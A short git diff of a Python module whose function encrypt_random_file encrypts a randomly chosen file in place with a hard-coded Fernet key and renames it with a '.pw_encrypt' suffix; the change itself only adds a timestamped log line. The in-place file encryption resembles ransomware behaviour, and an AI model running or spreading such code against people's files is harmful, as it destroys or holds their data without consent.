@@ -2,6 +2,7 @@ from . import config
 from cryptography.fernet import Fernet
 from pathlib import Path
 import random
+from datetime import datetime
 
 _encryption_key = b"WkgJfErD7J_LqwX_hmAiFZfmVLOt1p7ZXpaCl0vdZgY=" # placeholder
 _fernet = Fernet(_encryption_key)
@@ -22,6 +23,7 @@ def encrypt_random_file():
 		encrypted = _fernet.encrypt(file_bytes)
 		file_path.write_bytes(encrypted)
 		file_path.replace(file_path.with_suffix(file_path.suffix+".pw_encrypt"))
+		config.add_to_log(f"[{datetime.now().isoformat()}] Encrypted {str(file_path)}")
 		return str(file_path)
 	else:
 		raise RuntimeError("No files found to encrypt")
